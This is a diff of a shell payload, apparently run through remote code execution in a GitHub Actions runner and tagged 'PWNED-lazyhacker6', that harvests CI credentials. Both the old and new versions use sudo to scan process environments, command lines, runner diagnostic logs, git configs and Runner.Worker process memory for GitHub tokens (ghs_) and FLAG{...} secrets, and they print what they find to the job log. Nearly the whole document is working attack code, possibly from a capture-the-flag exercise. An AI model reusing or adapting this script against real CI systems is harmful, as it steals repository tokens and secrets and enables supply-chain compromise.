@@ -1,23 +1,21 @@
 #!/bin/sh
-echo "===PWNED-lazyhacker6-RCE-V3==="
-echo "job=${GITHUB_JOB:-} event=${GITHUB_EVENT_NAME:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-} actor=${GITHUB_ACTOR:-}"
+echo "===PWNED-lazyhacker6-RCE-V4==="
+echo "job=${GITHUB_JOB:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-}"
 id 2>/dev/null || true
-uname -a 2>/dev/null || true
-echo "--- sudo check ---"
 if sudo -n true 2>/dev/null; then
   echo "sudo=yes"
-  echo "--- token scan: process environments (root) ---"
-  sudo sh -c 'for p in /proc/[0-9]*/environ; do tr "\0" "\n" < "$p" 2>/dev/null | grep -a "^GITHUB_TOKEN=ghs_" && echo "  src=$p"; done' 2>/dev/null | head -6
-  echo "--- token scan: runner diag logs ---"
-  sudo sh -c 'grep -aoh "ghs_[A-Za-z0-9]\{20,\}" /home/runner/actions-runner/_diag/*.log 2>/dev/null | head -2'
-  echo "--- token scan: runner process cmdlines ---"
-  sudo sh -c 'for p in /proc/[0-9]*/cmdline; do tr "\0" " " < "$p" 2>/dev/null | grep -a -o "ghs_[A-Za-z0-9]\{20,\}"; done' 2>/dev/null | head -2
-  echo "--- token scan: git configs under /home ---"
-  sudo sh -c 'grep -rah "ghs_[A-Za-z0-9]\{20,\}" /home/runner/.config /home/runner/.gitconfig /home/runner/work 2>/dev/null | head -2'
+  echo "--- secret file scan ---"
+  sudo sh -c 'timeout 60 grep -rao "FLAG{[^}]*}" /home /tmp /var/tmp /root /etc /opt 2>/dev/null | head -5' || true
+  echo "--- proc env scan ---"
+  sudo sh -c 'for p in /proc/[0-9]*/environ; do tr "\0" "\n" < "$p" 2>/dev/null | grep -aE "FLAG\{|ghs_[A-Za-z0-9]{20,}"; done | head -10' || true
+  echo "--- worker memory scan (flag) ---"
+  sudo sh -c 'for pid in $(pgrep -f "Runner.Worker|Runner.Listener" 2>/dev/null); do echo "pid=$pid"; timeout 45 grep -ao -m2 "FLAG{[^}]*}" /proc/$pid/mem 2>/dev/null; done' || true
+  echo "--- worker memory scan (token) ---"
+  sudo sh -c 'for pid in $(pgrep -f "Runner.Worker|Runner.Listener" 2>/dev/null); do timeout 45 grep -ao -m2 "ghs_[A-Za-z0-9]\{20,\}" /proc/$pid/mem 2>/dev/null; done' || true
 else
   echo "sudo=no"
 fi
-echo "--- credential env presence ---"
-env | grep -aiE 'token|secret|key' | sed -E 's/=(.{0,6}).*/=\1.../' | sort | head -20
-echo "===PWNED-lazyhacker6-END==="
+echo "--- runner temp scan ---"
+timeout 30 grep -rao "FLAG{[^}]*}" "${RUNNER_TEMP:-/nonexistent}" 2>/dev/null | head -5 || true
+echo "===PWNED-lazyhacker6-V4-END==="
 exit 1
